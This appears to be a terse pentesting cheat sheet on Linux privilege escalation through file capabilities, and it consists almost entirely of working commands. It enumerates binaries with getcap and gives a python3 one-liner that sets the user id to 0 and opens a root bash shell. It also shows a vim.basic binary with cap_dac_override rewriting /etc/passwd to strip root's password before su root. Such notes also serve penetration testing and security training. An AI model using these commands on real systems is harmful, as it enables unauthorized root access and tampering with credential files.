
```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
```
getcap -r / 2>/dev/null
```
- cap_setuid
- cap_sys_admin
- cap_dac_read_search
- cap_setgid
- cap_chown
If capability is set on python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

For example we find:
/usr/bin/vim.basic cap_dac_override =eip

We use the capability to modify the /etc/passwd file and remove the password for root
```
/usr/bin/vim.basic /etc/passwd
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
su root
```